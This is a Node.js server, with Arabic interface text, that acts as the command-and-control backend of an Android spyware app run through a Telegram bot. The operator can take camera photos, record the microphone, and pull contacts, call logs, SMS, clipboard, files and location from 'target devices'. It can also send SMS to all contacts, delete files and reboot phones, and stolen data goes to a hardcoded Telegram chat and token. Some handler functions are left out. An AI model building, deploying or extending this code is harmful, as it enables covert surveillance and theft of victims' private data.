const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

// الثوابت
const TOKEN = '7748520168:AAFGnwcqJfyo_26cBnsySWWHwSOWYRDs3ts';
const CHAT_ID = '1630822492';
const PING_ADDRESS = 'https://www.google.com';
const PORT = process.env.PORT || 8999;

// الشعارات والرموز
const EMOJIS = {
    SERVER: '🖥️',
    CONNECTION: '📡',
    DEVICE: '📱',
    COMMAND: '⚙️',
    MESSAGE: '📨',
    FILE: '📁',
    CAMERA: '📸',
    MICROPHONE: '🎤',
    LOCATION: '📍',
    NOTIFICATION: '🔔',
    AUDIO: '🎵',
    CONTACT: '👤',
    CALL: '📞',
    INFO: 'ℹ️',
    SUCCESS: '✅',
    ERROR: '❌',
    WARNING: '⚠️',
    LOCK: '🔒',
    KEYBOARD: '⌨️',
    CLIPBOARD: '📋',
    VIBRATE: '📳',
    TOAST: '💬',
    APPS: '📲',
    BATTERY: '🔋',
    BRIGHTNESS: '☀️',
    VERSION: '🔄',
    PROVIDER: '🏢',
    SETTINGS: '⚡'
};

// تهيئة التطبيق
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(TOKEN, { polling: true });
const appClients = new Map();

// المتغيرات المؤقتة
let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// الوسائط
const upload = multer();
app.use(bodyParser.json());

// ==================== مسارات API ====================

app.get('/', (req, res) => {
    const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>${EMOJIS.SERVER} سيرفر التحكم</title>
            <meta charset="UTF-8">
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    margin: 0;
                    padding: 20px;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    color: white;
                }
                .container {
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(10px);
                    border-radius: 20px;
                    padding: 40px;
                    text-align: center;
                    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                }
                h1 {
                    font-size: 2.5em;
                    margin-bottom: 20px;
                    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
                }
                .emoji {
                    font-size: 3em;
                    margin-bottom: 20px;
                    animation: float 3s ease-in-out infinite;
                }
                @keyframes float {
                    0%, 100% { transform: translateY(0); }
                    50% { transform: translateY(-10px); }
                }
                .status {
                    font-size: 1.2em;
                    opacity: 0.9;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="emoji">${EMOJIS.SERVER}</div>
                <h1>تم رفع السيرفر بنجاح ✅</h1>
                <p class="status">جاهز لاستقبال الاتصالات ${EMOJIS.CONNECTION}</p>
            </div>
        </body>
        </html>
    `;
    res.send(html);
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    appBot.sendDocument(CHAT_ID, req.file.buffer, {
        caption: `${EMOJIS.FILE} ${EMOJIS.DEVICE} رسالة من جهاز <b>${req.headers.model}</b>`,
        parse_mode: "HTML"
    }, {
        filename: fileName,
        contentType: 'application/txt',
    });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    const message = `${EMOJIS.MESSAGE} ${EMOJIS.DEVICE} رسالة من جهاز <b>${req.headers.model}</b>\n\n${req.body['text']}`;
    appBot.sendMessage(CHAT_ID, message, { parse_mode: "HTML" });
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(CHAT_ID, req.body['lat'], req.body['lon']);
    appBot.sendMessage(CHAT_ID, 
        `${EMOJIS.LOCATION} ${EMOJIS.DEVICE} موقع من جهاز <b>${req.headers.model}</b>`, 
        { parse_mode: "HTML" }
    );
    res.send('');
});

// ==================== WebSocket Events ====================

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const { model, battery, version, brightness, provider } = req.headers;
    
    ws.uuid = uuid;
    appClients.set(uuid, { model, battery, version, brightness, provider });
    
    // إرسال رسالة اتصال
    sendDeviceMessage(model, battery, version, brightness, provider, 'اتصال');
    
    ws.on('close', () => {
        sendDeviceMessage(model, battery, version, brightness, provider, 'انفصال');
        appClients.delete(ws.uuid);
    });
});

// ==================== معالجة رسائل البوت ====================

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    
    if (chatId != CHAT_ID) {
        appBot.sendMessage(CHAT_ID, `${EMOJIS.LOCK} ${EMOJIS.ERROR} تم رفض الإذن`);
        return;
    }
    
    if (message.reply_to_message) {
        handleReplyMessage(message);
        return;
    }
    
    switch (message.text) {
        case '/start':
            sendWelcomeMessage();
            break;
        case `${EMOJIS.DEVICE} الأجهزة المتصلة`:
            listConnectedDevices();
            break;
        case `${EMOJIS.COMMAND} تنفيذ أمر`:
            executeCommand();
            break;
        case `${EMOJIS.SETTINGS} لوحة التحكم`:
            showControlPanel();
            break;
        case `${EMOJIS.INFO} المساعدة`:
            sendHelpMessage();
            break;
    }
});

// ==================== معالجة استعلامات الرد ====================

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const [command, uuid] = data.split(':');
    
    if (command === 'device') {
        showDeviceCommands(uuid, msg);
    } else {
        handleCommand(command, uuid, msg);
    }
});

// ==================== الدوال المساعدة ====================

function sendDeviceMessage(model, battery, version, brightness, provider, status) {
    const statusEmoji = status === 'اتصال' ? `${EMOJIS.SUCCESS}` : `${EMOJIS.ERROR}`;
    const statusText = status === 'اتصال' ? 'جهاز جديد متصل' : 'تم فصل الجهاز';
    
    const message = `${statusEmoji} ${EMOJIS.CONNECTION} *${statusText}*\n\n` +
        `${EMOJIS.DEVICE} *موديل الجهاز:* <b>${model}</b>\n` +
        `${EMOJIS.BATTERY} *البطارية:* <b>${battery}</b>\n` +
        `${EMOJIS.VERSION} *إصدار الأندرويد:* <b>${version}</b>\n` +
        `${EMOJIS.BRIGHTNESS} *سطوع الشاشة:* <b>${brightness}</b>\n` +
        `${EMOJIS.PROVIDER} *مزود الخدمة:* <b>${provider}</b>`;
    
    appBot.sendMessage(CHAT_ID, message, { parse_mode: "HTML" });
}

function sendWelcomeMessage() {
    const message = 
        `🎯 *مرحباً بك في لوحة التحكم*\n\n` +
        `${EMOJIS.DEVICE} *الجهاز المتصل:*\n` +
        `   └─ انتظر اتصال الجهاز المستهدف\n\n` +
        `${EMOJIS.CONNECTION} *حالة الاتصال:*\n` +
        `   └─ ستظهر رسالة عند اتصال أي جهاز\n\n` +
        `${EMOJIS.COMMAND} *الأوامر المتاحة:*\n` +
        `   ├─ ${EMOJIS.DEVICE} الأجهزة المتصلة\n` +
        `   ├─ ${EMOJIS.COMMAND} تنفيذ أمر\n` +
        `   ├─ ${EMOJIS.SETTINGS} لوحة التحكم\n` +
        `   └─ ${EMOJIS.INFO} المساعدة\n\n` +
        `${EMOJIS.WARNING} *ملاحظة:*\n` +
        `   └─ أرسل /start في أي وقت للعودة للقائمة الرئيسية`;
    
    appBot.sendMessage(CHAT_ID, message, {
        parse_mode: "Markdown",
        reply_markup: {
            keyboard: [
                [`${EMOJIS.DEVICE} الأجهزة المتصلة`],
                [`${EMOJIS.COMMAND} تنفيذ أمر`],
                [`${EMOJIS.SETTINGS} لوحة التحكم`, `${EMOJIS.INFO} المساعدة`]
            ],
            resize_keyboard: true
        }
    });
}

function showControlPanel() {
    const message = 
        `${EMOJIS.SETTINGS} *لوحة التحكم*\n\n` +
        `${EMOJIS.INFO} *إحصائيات النظام:*\n` +
        `   └─ الأجهزة المتصلة: *${appClients.size}*\n\n` +
        `${EMOJIS.COMMAND} *الأوامر السريعة:*\n` +
        `   ├─ /start - القائمة الرئيسية\n` +
        `   ├─ /help - المساعدة\n` +
        `   └─ /status - حالة النظام\n\n` +
        `${EMOJIS.DEVICE} *إدارة الأجهزة:*\n` +
        `   └─ اضغط على "الأجهزة المتصلة" لعرض جميع الأجهزة`;
    
    appBot.sendMessage(CHAT_ID, message, { parse_mode: "Markdown" });
}

function sendHelpMessage() {
    const message = 
        `${EMOJIS.INFO} *دليل الاستخدام*\n\n` +
        `1️⃣ ${EMOJIS.DEVICE} *تثبيت التطبيق:*\n` +
        `   └─ قم بتثبيت التطبيق على الجهاز المستهدف\n\n` +
        `2️⃣ ${EMOJIS.CONNECTION} *انتظار الاتصال:*\n` +
        `   └─ انتظر حتى يظهر الجهاز في قائمة الأجهزة المتصلة\n\n` +
        `3️⃣ ${EMOJIS.COMMAND} *تنفيذ الأوامر:*\n` +
        `   └─ اختر الجهاز ثم اختر الأمر المطلوب\n\n` +
        `${EMOJIS.WARNING} *نصائح مهمة:*\n` +
        `   • تأكد من اتصال الإنترنت على الجهاز\n` +
        `   • بعض الأوامر تتطلب إذونات خاصة\n` +
        `   • الأوامر قد تستغرق بضع ثوانٍ للتنفيذ`;
    
    appBot.sendMessage(CHAT_ID, message, { parse_mode: "Markdown" });
}

function listConnectedDevices() {
    if (appClients.size === 0) {
        appBot.sendMessage(CHAT_ID, 
            `${EMOJIS.ERROR} ${EMOJIS.WARNING} *لا توجد أجهزة متصلة*\n\n` +
            `${EMOJIS.DEVICE} تأكد من:\n` +
            `   • تثبيت التطبيق على الجهاز المستهدف\n` +
            `   • اتصال الجهاز بالإنترنت\n` +
            `   • تشغيل التطبيق على الجهاز`,
            { parse_mode: "Markdown" }
        );
        return;
    }
    
    let text = `${EMOJIS.SUCCESS} ${EMOJIS.DEVICE} *قائمة الأجهزة المتصلة (${appClients.size})*\n\n`;
    
    let counter = 1;
    appClients.forEach((value, key) => {
        text += `${counter}️⃣ *الجهاز ${counter}:*\n` +
               `   ${EMOJIS.DEVICE} الموديل: <b>${value.model}</b>\n` +
               `   ${EMOJIS.BATTERY} البطارية: <b>${value.battery}</b>\n` +
               `   ${EMOJIS.VERSION} الإصدار: <b>${value.version}</b>\n` +
               `   ${EMOJIS.PROVIDER} المزود: <b>${value.provider}</b>\n` +
               `   ${EMOJIS.CONNECTION} المعرف: <code>${key.substring(0, 8)}...</code>\n\n`;
        counter++;
    });
    
    appBot.sendMessage(CHAT_ID, text, { 
        parse_mode: "HTML",
        reply_markup: {
            keyboard: [
                [`${EMOJIS.DEVICE} الأجهزة المتصلة`],
                [`${EMOJIS.COMMAND} تنفيذ أمر`],
                [`${EMOJIS.SETTINGS} لوحة التحكم`]
            ],
            resize_keyboard: true
        }
    });
}

function executeCommand() {
    if (appClients.size === 0) {
        appBot.sendMessage(CHAT_ID,
            `${EMOJIS.ERROR} ${EMOJIS.DEVICE} *لا توجد أجهزة متصلة*\n\n` +
            `${EMOJIS.WARNING} اضغط على "الأجهزة المتصلة" للتحقق`,
            { parse_mode: "Markdown" }
        );
        return;
    }
    
    const deviceListKeyboard = [];
    let counter = 1;
    
    appClients.forEach((value, key) => {
        deviceListKeyboard.push([{
            text: `${counter}️⃣ ${EMOJIS.DEVICE} ${value.model.substring(0, 20)}`,
            callback_data: 'device:' + key
        }]);
        counter++;
    });
    
    // إضافة زر العودة
    deviceListKeyboard.push([{
        text: `${EMOJIS.WARNING} العودة للقائمة الرئيسية`,
        callback_data: 'back'
    }]);
    
    appBot.sendMessage(CHAT_ID, 
        `${EMOJIS.COMMAND} *اختر الجهاز لتنفيذ الأمر:*\n\n` +
        `${EMOJIS.INFO} يوجد ${appClients.size} جهاز متصل`,
        {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: deviceListKeyboard,
            },
        }
    );
}

function showDeviceCommands(uuid, msg) {
    const device = appClients.get(uuid);
    if (!device) return;
    
    const message = 
        `${EMOJIS.COMMAND} *الأوامر المتاحة للجهاز:*\n` +
        `${EMOJIS.DEVICE} <b>${device.model}</b>\n\n` +
        `${EMOJIS.INFO} اختر أحد الأوامر التالية:`;
    
    appBot.editMessageText(message, {
        chat_id: CHAT_ID,
        message_id: msg.message_id,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: getCommandKeyboard(uuid)
        }
    });
}

function getCommandKeyboard(uuid) {
    return [
        // الصف الأول: المعلومات الأساسية
        [
            { text: `${EMOJIS.INFO} معلومات`, callback_data: `device_info:${uuid}` },
            { text: `${EMOJIS.APPS} التطبيقات`, callback_data: `apps:${uuid}` },
            { text: `${EMOJIS.CLIPBOARD} الحافظة`, callback_data: `clipboard:${uuid}` }
        ],
        // الصف الثاني: الملفات
        [
            { text: `${EMOJIS.FILE} الحصول على ملف`, callback_data: `file:${uuid}` },
            { text: `${EMOJIS.ERROR} حذف ملف`, callback_data: `delete_file:${uuid}` }
        ],
        // الصف الثالث: الوسائط
        [
            { text: `${EMOJIS.CAMERA} كاميرا رئيسية`, callback_data: `camera_main:${uuid}` },
            { text: `${EMOJIS.CAMERA} كاميرا سيلفي`, callback_data: `camera_selfie:${uuid}` },
            { text: `${EMOJIS.MICROPHONE} ميكروفون`, callback_data: `microphone:${uuid}` }
        ],
        // الصف الرابع: الاتصالات
        [
            { text: `${EMOJIS.CALL} المكالمات`, callback_data: `calls:${uuid}` },
            { text: `${EMOJIS.CONTACT} جهات الاتصال`, callback_data: `contacts:${uuid}` },
            { text: `${EMOJIS.MESSAGE} الرسائل`, callback_data: `messages:${uuid}` }
        ],
        // الصف الخامس: إرسال رسائل
        [
            { text: `${EMOJIS.MESSAGE} إرسال رسالة`, callback_data: `send_message:${uuid}` },
            { text: `${EMOJIS.MESSAGE} إرسال للجميع`, callback_data: `send_message_to_all:${uuid}` }
        ],
        // الصف السادس: التنبيهات
        [
            { text: `${EMOJIS.LOCATION} الموقع`, callback_data: `location:${uuid}` },
            { text: `${EMOJIS.TOAST} رسالة عائمة`, callback_data: `toast:${uuid}` },
            { text: `${EMOJIS.NOTIFICATION} إشعار`, callback_data: `show_notification:${uuid}` }
        ],
        // الصف السابع: الصوت
        [
            { text: `${EMOJIS.AUDIO} تشغيل صوت`, callback_data: `play_audio:${uuid}` },
            { text: `${EMOJIS.AUDIO} إيقاف صوت`, callback_data: `stop_audio:${uuid}` },
            { text: `${EMOJIS.VIBRATE} اهتزاز`, callback_data: `vibrate:${uuid}` }
        ],
        // الصف الثامن: التحكم
        [
            { text: `${EMOJIS.KEYBOARD} لوحة مفاتيح`, callback_data: `keyboard:${uuid}` },
            { text: `${EMOJIS.WARNING} إعادة تشغيل`, callback_data: `reboot:${uuid}` },
            { text: `${EMOJIS.ERROR} إغلاق`, callback_data: `shutdown:${uuid}` }
        ],
        // الصف الأخير: التنقل
        [
            { text: `${EMOJIS.WARNING} العودة للخلف`, callback_data: 'back' },
            { text: `${EMOJIS.INFO} تحديث`, callback_data: `refresh:${uuid}` }
        ]
    ];
}

function handleCommand(command, uuid, msg) {
    // الأوامر المباشرة (بدون رد)
    const directCommands = {
        'calls': `${EMOJIS.CALL} جاري جلب سجل المكالمات...`,
        'contacts': `${EMOJIS.CONTACT} جاري جلب جهات الاتصال...`,
        'messages': `${EMOJIS.MESSAGE} جاري جلب الرسائل...`,
        'apps': `${EMOJIS.APPS} جاري جلب قائمة التطبيقات...`,
        'device_info': `${EMOJIS.INFO} جاري جمع معلومات الجهاز...`,
        'clipboard': `${EMOJIS.CLIPBOARD} جاري جلب محتوى الحافظة...`,
        'camera_main': `${EMOJIS.CAMERA} جاري التقاط صورة من الكاميرا الرئيسية...`,
        'camera_selfie': `${EMOJIS.CAMERA} جاري التقاط صورة من كاميرا السيلفي...`,
        'location': `${EMOJIS.LOCATION} جاري الحصول على الموقع...`,
        'vibrate': `${EMOJIS.VIBRATE} جارية تفعيل وضع الاهتزاز...`,
        'stop_audio': `${EMOJIS.AUDIO} جاري إيقاف الصوت...`,
        'keyboard': `${EMOJIS.KEYBOARD} جاري فتح لوحة المفاتيح...`,
        'reboot': `${EMOJIS.WARNING} جارية إعادة تشغيل الجهاز...`,
        'shutdown': `${EMOJIS.ERROR} جاري إغلاق الجهاز...`,
        'refresh': `${EMOJIS.INFO} جاري تحديث المعلومات...`
    };

    if (directCommands[command]) {
        executeDirectCommand(command, uuid, msg, directCommands[command]);
        return;
    }

    // الأوامر التي تحتاج رد
    const replyCommands = {
        'send_message': {
            emoji: EMOJIS.MESSAGE,
            message: `${EMOJIS.MESSAGE} *إرسال رسالة نصية*\n\n` +
                    `${EMOJIS.INFO} أدخل رقم الهاتف:\n` +
                    `• للأرقام المحلية: ابدأ بالصفر (059xxxxxxx)\n` +
                    `• للأرقام الدولية: أضف رمز الدولة (+9665xxxxxxxx)`,
            setUuid: true
        },
        'send_message_to_all': {
            emoji: EMOJIS.MESSAGE,
            message: `${EMOJIS.MESSAGE} *إرسال رسالة للجميع*\n\n` +
                    `${EMOJIS.WARNING} هذه الرسالة ستُرسل لجميع جهات الاتصال\n` +
                    `${EMOJIS.INFO} أدخل نص الرسالة:`,
            setUuid: true
        },
        'file': {
            emoji: EMOJIS.FILE,
            message: `${EMOJIS.FILE} *تحميل ملف*\n\n` +
                    `${EMOJIS.INFO} أدخل مسار الملف:\n` +
                    `• مثال: DCIM/Camera\n` +
                    `• مثال: Download/File.pdf\n` +
                    `• مثال: /sdcard/`,
            setUuid: true
        },
        'delete_file': {
            emoji: EMOJIS.ERROR,
            message: `${EMOJIS.ERROR} *حذف ملف*\n\n` +
                    `${EMOJIS.WARNING} هذا الإجراء لا يمكن التراجع عنه\n` +
                    `${EMOJIS.INFO} أدخل مسار الملف للحذف:`,
            setUuid: true
        },
        'microphone': {
            emoji: EMOJIS.MICROPHONE,
            message: `${EMOJIS.MICROPHONE} *تسجيل صوتي*\n\n` +
                    `${EMOJIS.INFO} أدخل مدة التسجيل (بالثواني):\n` +
                    `• الحد الأدنى: 5 ثواني\n` +
                    `• الحد الأقصى: 300 ثواني\n` +
                    `• مثال: 30`,
            setUuid: true
        },
        'toast': {
            emoji: EMOJIS.TOAST,
            message: `${EMOJIS.TOAST} *رسالة عائمة*\n\n` +
                    `${EMOJIS.INFO} أدخل النص الذي سيظهر:\n` +
                    `• الرسالة تظهر لبضع ثواني\n` +
                    `• مثالية للإشعارات السريعة`,
            setUuid: true
        },
        'show_notification': {
            emoji: EMOJIS.NOTIFICATION,
            message: `${EMOJIS.NOTIFICATION} *إشعار نظام*\n\n` +
                    `${EMOJIS.INFO} أدخل عنوان الإشعار:\n` +
                    `• سيظهر في شريط الإشعارات\n` +
                    `• يمكن إضافة رابط لاحقاً`,
            setUuid: true
        },
        'play_audio': {
            emoji: EMOJIS.AUDIO,
            message: `${EMOJIS.AUDIO} *تشغيل صوت*\n\n` +
                    `${EMOJIS.INFO} أدخل رابط الصوت:\n` +
                    `• يجب أن يكون رابطاً مباشراً\n` +
                    `• يدعم: MP3, WAV, AAC\n` +
                    `• مثال: https://example.com/sound.mp3`,
            setUuid: true
        }
    };

    if (replyCommands[command]) {
        const cmd = replyCommands[command];
        appBot.deleteMessage(CHAT_ID, msg.message_id);
        appBot.sendMessage(CHAT_ID, cmd.message, {
            reply_markup: { force_reply: true },
            parse_mode: "Markdown"
        });
        
        if (cmd.setUuid) {
            currentUuid = uuid;
        }
    } else if (command === 'back') {
        appBot.deleteMessage(CHAT_ID, msg.message_id);
        executeCommand();
    }
}

function executeDirectCommand(command, uuid, msg, statusMessage) {
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === uuid) {
            ws.send(command);
        }
    });
    
    appBot.deleteMessage(CHAT_ID, msg.message_id);
    
    const message = `${statusMessage}\n\n` +
                   `${EMOJIS.INFO} *جاري المعالجة...*\n` +
                   `${EMOJIS.WARNING} قد تستغرق العملية بضع ثواني`;
    
    appBot.sendMessage(CHAT_ID, message, {
        parse_mode: "Markdown",
        reply_markup: {
            keyboard: [
                [`${EMOJIS.DEVICE} الأجهزة المتصلة`],
                [`${EMOJIS.COMMAND} تنفيذ أمر`],
                [`${EMOJIS.SETTINGS} لوحة التحكم`]
            ],
            resize_keyboard: true
        }
    });
}

function handleReplyMessage(message) {
    const replyText = message.reply_to_message.text;
    
    // استخراج النوع من الرسالة
    if (replyText.includes('إرسال رسالة نصية')) {
        handleSMSReply(message);
    } else if (replyText.includes('أدخل رقم الهاتف')) {
        handleSMSNumberReply(message);
    } else if (replyText.includes('أدخل نص الرسالة')) {
        handleSMSTextReply(message);
    } else if (replyText.includes('إرسال رسالة للجميع')) {
        handleMessageToAllReply(message);
    } else if (replyText.includes('تحميل ملف')) {
        handleFileOperationReply(message, 'file');
    } else if (replyText.includes('حذف ملف')) {
        handleFileOperationReply(message, 'delete_file');
    } else if (replyText.includes('تسجيل صوتي')) {
        handleMicrophoneReply(message);
    } else if (replyText.includes('رسالة عائمة')) {
        handleToastReply(message);
    } else if (replyText.includes('إشعار نظام')) {
        handleNotificationTitleReply(message);
    } else if (replyText.includes('أدخل رابط الإشعار')) {
        handleNotificationLinkReply(message);
    } else if (replyText.includes('تشغيل صوت')) {
        handleAudioReply(message);
    }
}

// باقي دوال المعالجة تبقى كما هي مع إضافة الشعارات
function handleSMSNumberReply(message) {
    currentNumber = message.text;
    appBot.sendMessage(CHAT_ID,
        `${EMOJIS.SUCCESS} ${EMOJIS.MESSAGE} *تم حفظ الرقم*\n\n` +
        `${EMOJIS.INFO} الآن أدخل نص الرسالة:\n` +
        `• الحد الأقصى: 160 حرف\n` +
        `• استخدم \\n للسطر الجديد`,
        { 
            reply_markup: { force_reply: true },
            parse_mode: "Markdown"
        }
    );
}

function handleSMSTextReply(message) {
    if (!currentNumber || !currentUuid) {
        appBot.sendMessage(CHAT_ID, `${EMOJIS.ERROR} حدث خطأ، حاول مرة أخرى`);
        return;
    }
    
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === currentUuid) {
            ws.send(`send_message:${currentNumber}/${message.text}`);
        }
    });
    
    appBot.sendMessage(CHAT_ID,
        `${EMOJIS.SUCCESS} ${EMOJIS.MESSAGE} *جاري إرسال الرسالة*\n\n` +
        `${EMOJIS.INFO} إلى: ${currentNumber}\n` +
        `${EMOJIS.MESSAGE} الرسالة: ${message.text.substring(0, 30)}${message.text.length > 30 ? '...' : ''}`,
        { parse_mode: "Markdown" }
    );
    
    currentNumber = '';
    currentUuid = '';
}

// باقي الدوال (handleMessageToAllReply, handleFileOperationReply, etc.)
// تبقى كما هي مع إضافة الشعارات المناسبة

// ==================== فحص الاتصال الدوري ====================

setInterval(() => {
    appSocket.clients.forEach((ws) => {
        ws.send('ping');
    });
    
    try {
        axios.get(PING_ADDRESS);
    } catch (error) {
        console.log(`${EMOJIS.WARNING} فحص الاتصال فشل`);
    }
}, 5000);

// ==================== تشغيل السيرفر ====================

appServer.listen(PORT, () => {
    console.log(`
    ${EMOJIS.SERVER} ${EMOJIS.SUCCESS} *سيرفر التحكم يعمل*
    
    ${EMOJIS.INFO} المعلومات:
    ├─ المنفذ: ${PORT}
    ├─ الأجهزة المتصلة: ${appClients.size}
    └─ حالة البوت: نشط
    
    ${EMOJIS.CONNECTION} جاهز لاستقبال الاتصالات...
    `);
});
